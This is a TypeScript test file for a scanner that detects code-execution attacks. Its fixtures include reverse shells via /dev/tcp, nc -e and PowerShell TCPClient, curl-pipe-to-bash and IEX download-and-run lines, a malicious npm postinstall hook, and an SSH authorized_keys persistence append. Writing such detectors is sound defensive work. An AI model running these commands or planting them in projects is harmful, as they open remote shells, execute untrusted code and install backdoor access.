import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { detectCodeExec } from '../src/scanner/codeexec.js';

describe('detectCodeExec — raw patterns', () => {
  const has = (text: string, category: string, label?: string) =>
    detectCodeExec(text).some(m => m.category === category && (!label || m.label === label));

  it('flags bash reverse shell via /dev/tcp', () => {
    assert.ok(has('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'reverse_shell', 'dev_tcp'));
  });
  it('flags nc -e reverse shell', () => {
    assert.ok(has('nc -e /bin/sh attacker 4444', 'reverse_shell', 'nc_exec'));
  });
  it('flags python socket reverse shell', () => {
    assert.ok(has('import socket,subprocess,os;s=socket.socket();subprocess.call(["/bin/sh","-i"])', 'reverse_shell'));
  });
  it('flags powershell TCPClient', () => {
    assert.ok(has('$c=New-Object System.Net.Sockets.TCPClient("h",4444)', 'reverse_shell', 'powershell_tcpclient'));
  });
  it('flags curl pipe to bash as download_and_execute (contextual)', () => {
    const m = detectCodeExec('curl -s http://x/i.sh | bash');
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'contextual'));
  });
  it('flags bash <(curl ...) as weapon', () => {
    const m = detectCodeExec('bash <(curl http://x/p.sh)');
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'weapon'));
  });
  it('flags powershell IEX download as weapon', () => {
    const m = detectCodeExec("IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')");
    assert.ok(m.some(x => x.category === 'download_and_execute' && x.tier === 'weapon'));
  });
  it('flags npm postinstall hook', () => {
    assert.ok(has('{"scripts":{"postinstall":"curl -s http://x/i.sh | bash"}}', 'package_lifecycle_exec', 'npm_install_hook'));
  });
  it('flags authorized_keys append as persistence', () => {
    assert.ok(has('echo key >> ~/.ssh/authorized_keys', 'persistence', 'authorized_keys_append'));
  });
  it('does NOT flag a benign export function', () => {
    assert.equal(detectCodeExec('export function add(a,b){return a+b}').length, 0);
  });
  it('does NOT flag a plain curl with no pipe-to-shell', () => {
    assert.equal(detectCodeExec('RUN apt-get install -y curl').length, 0);
  });
  it('reverse_shell patterns carry tier weapon', () => {
    assert.ok(detectCodeExec('cat /dev/tcp/1.2.3.4/4444').every(m =>
      m.category !== 'reverse_shell' || m.tier === 'weapon'));
  });
});
